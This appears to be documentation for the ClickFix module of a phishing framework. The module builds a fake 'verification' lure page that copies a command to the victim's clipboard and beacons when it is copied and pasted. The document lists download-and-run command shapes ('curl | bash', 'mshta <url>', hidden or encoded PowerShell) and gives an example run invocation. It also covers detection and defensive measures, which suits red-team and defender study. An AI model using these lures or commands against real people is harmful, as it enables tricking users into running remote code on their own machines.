# ClickFix: the paste layer

Every other technique in this framework steals a session. This one does not. The target is
asked to run a command, and the command runs with their own rights, on their own machine,
inside their own session - which is exactly why it is the answer to the controls that kill
tier 2.

```mermaid
sequenceDiagram
    participant V as Victim
    participant P as Lure page
    participant B as Browser
    participant O as Operator
    V->>P: opens the link
    P->>V: "verification required" + a copy button
    V->>B: clicks the button
    B->>B: clipboard.writeText(command)
    B->>O: beacon: copy
    V->>B: Win+R, Ctrl+V, Enter
    B->>O: beacon: paste
    Note over V: the command runs as the user,<br/>not as the browser
```

## Why it beats a device-bound session

| Control | Stops AiTM (tier 2) | Stops ClickFix (tier 3) |
|---|---|---|
| Device-bound session (DBSC) | yes | **no** |
| CAE-aware session | yes | **no** |
| Phishing-resistant MFA / passkeys | yes | **no** |
| Conditional access (compliant device) | yes | **no** |
| Clipboard-write permission prompt | n/a | partially |
| Blocking `powershell -enc` / `mshta` / `curl|bash` | n/a | **yes** |
| User training ("never paste commands") | n/a | **yes** |

The bottom two rows are the whole defence, and they are the two the operator should assume are
in place before choosing this.

## What this framework provides, and what it does not

**Provides** (`core/clickfix.py`): the page, the fake verification step, the clipboard write,
the platform-specific instructions, and the beacon that reports the copy and the paste.

**Does not provide**: the payload. `--clickfix-command` is the operator's, and the module
refuses to render a page with an empty command rather than shipping a placeholder that looks
like one.

## The command shapes

Recognise the choice before making it:

| Platform | Shape | What it looks like in a process list |
|---|---|---|
| Windows | `powershell -w hidden -c "<payload>"` | a hidden PowerShell child of `explorer.exe` |
| Windows | `powershell -enc <base64>` | an encoded blob, no readable arguments |
| Windows | `mshta <url>` | a signed Microsoft binary fetching a remote HTA |
| Windows | `curl -s <url> \| powershell -` | a download piped into an interpreter |
| macOS | `osascript -e '<script>'` | AppleScript from a non-Apple parent |
| macOS | `curl -s <url> \| bash` | the same pipe, on a shell |
| Linux | `curl -s <url> \| bash`, `wget -qO- <url> \| sh` | the same pipe, on a shell |

## What the blue team sees

```mermaid
flowchart TD
    C["clipboard.writeText on a page that is not<br/>the clipboard owner"] --> D1["browser permission prompt<br/>(Chrome/Edge: clipboard-write)"]
    P["Run dialog launches an interpreter"] --> D2["PowerShell script-block logging<br/>Run MRU in the registry"]
    P --> D3["EDR: a new process making<br/>a first-seen HTTPS request"]
    P --> D4["Windows: 4688 process creation<br/>Linux: auditd execve<br/>macOS: unified log"]
    N["the interpreter's own egress"] --> D5["proxy/DNS: not the browser's user agent,<br/>not the browser's TLS fingerprint"]
    style C fill:#2a2a2a,stroke:#888,color:#fff
    style P fill:#3a1f1f,stroke:#c33,color:#fff
    style N fill:#1f2f3a,stroke:#39c,color:#fff
```

The single most reliable detection is the last one: the request leaves through the interpreter,
so it does not carry the browser's user agent or its TLS fingerprint. A campaign that spent
effort on JA3/JA4 parity loses that parity the moment the command runs.

## Defensive notes

1. **Clipboard permission**: prompt on clipboard writes from pages that are not the focused
   clipboard owner (Chrome and Edge already do).
2. **Interpreter arguments**: alert on `-enc`/`-EncodedCommand`, `-w hidden`, `mshta` with a
   URL, and any `curl|wget` piped into `sh`/`bash`/`powershell` - none of these are normal user
   activity.
3. **Process parentage**: an interpreter whose parent is `explorer.exe` (or a shell started from
   a browser-focused session) is the ClickFix signature.
4. **Egress**: block and alert on interpreter-initiated HTTPS to first-seen domains.
5. **Training**: the only control that addresses the actual mechanism is "never paste a command
   from a page into Run or a terminal", and it should be tested with the same regularity as
   phishing simulations.

## Running it

```bash
# the page, with the operator's own command
./bytephisher.py --clickfix-command 'powershell -w hidden -c "iwr http://x"' \
                 --clickfix-platform windows --clickfix-out ./lure/verify.html

# the page copies it, beacons the copy and the paste, and shows the detection notes
```

The page is self-contained (no external assets), and the beacon path is the campaign's own
`/__bh/beacon`, so the copy and the paste land in the same session record as everything else.
